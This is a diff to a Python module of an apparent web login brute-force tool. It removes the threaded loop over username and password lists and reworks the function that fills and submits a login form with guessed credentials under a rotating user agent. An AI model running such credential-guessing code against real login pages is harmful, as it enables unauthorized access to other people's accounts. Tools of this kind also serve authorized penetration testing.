@@ -21,69 +21,10 @@
 # TODO break task after matching
 # BUG Matching error if sending payload to login.php (redirect?)
 
-import mechanize, sys, threading
-from core import utils, actions, tbrowser
+import mechanize, sys
+from core import utils, actions, tbrowser		
 
-
-def do_job(jobs):
-	for job in jobs:
-		job.daemon = True
-		job.start()
-		
-	for job in jobs:
-		job.join()
-
-def handle(optionURL, optionUserlist, optionPasslist, optionKeyFalse, optionThreads, optionRun):
-	# get login form info 
-	# call brute
-	
-	optionProxy, optionLog, optionVerbose = optionRun.values()
-	
-	sizePasslist = actions.size_o(optionPasslist)
-	sizeUserlist = actions.size_o(optionUserlist)
-	proc = tbrowser.startBrowser()
-	proc.addheaders = [('User-Agent', tbrowser.useragent())]
-
-
-	try:
-		utils.printf("Checking connection...")
-		proc.open(optionURL)
-		#TODO PROXY
-		loginInfo = tbrowser.getLoginForm(optionURL, proc)
-		utils.printf("Connection success! Starting attack.")
-
-	except Exception as err:
-		utils.die("Error while parsing login form", err)
-
-	finally:
-		proc.close()
-	
-	workers = []
-
-	for passwd in optionPasslist:
-		for usr in optionUserlist:
-
-			if len(workers) == optionThreads:
-				do_job(workers)
-				del workers[:]
-
-			worker = threading.Thread(
-				target = brute,
-				args = (
-					optionURL, usr, passwd, sizeUserlist * sizePasslist,
-					optionProxy, optionKeyFalse, optionVerbose, optionLog,
-					loginInfo
-				)
-			)
-			workers.append(worker)
-	
-	#DO ALL LAST TASKs
-	for worker in workers:
-		do_job(workers)
-		del workers[:]
-		
-
-def brute(optionURL, tryUsername, tryPassword, sizeTask, setProxyList, setKeyFalse, optionVerbose, optionLog, loginInfo):
+def submit(optionURL, tryUsername, tryPassword, sizeTask, setProxyList, setKeyFalse, optionVerbose, optionLog, loginInfo, trying):
 	############################################
 	#	Old code logic:
 	#		Create 1 browser object per password
@@ -95,17 +36,11 @@ def brute(optionURL, tryUsername, tryPassword, sizeTask, setProxyList, setKeyFal
 
 	#	Get login form field informations
 	frmLoginID, frmUserfield, frmPassfield = loginInfo
-	#	Get single Username in username list / file
-	# for tryUsername in optionUserlist:
-	# 	#	If tryUsername is file object, remove \n
-	# 	tryUsername = tryUsername.replace('\n', '')
-	
+	#	Get single Username in username list / file	
 	
 	proc = tbrowser.startBrowser()
 
-	idxTry = 0
-		#	Get single Password, remove \n
-	tryPassword = tryPassword.replace('\n', '')
+	#	Get single Password, remove \n
 
 	#	New test code block: add new user_agent each try
 	user_agent = tbrowser.useragent()
@@ -123,15 +58,13 @@ def brute(optionURL, tryUsername, tryPassword, sizeTask, setProxyList, setKeyFal
 		#	End new code block
 	
 	try:
-		idxTry += 1
 
 		#	Select login form
 		proc.select_form(nr = frmLoginID)
 		proc.form[frmUserfield] = tryUsername
 		proc.form[frmPassfield] = tryPassword
 
-		# BUG: idxTry is always 1
-		#utils.printp(idxTry, sizeTask)
+		utils.printp(trying, sizeTask)
 
 		#	Send request
 		proc.submit()
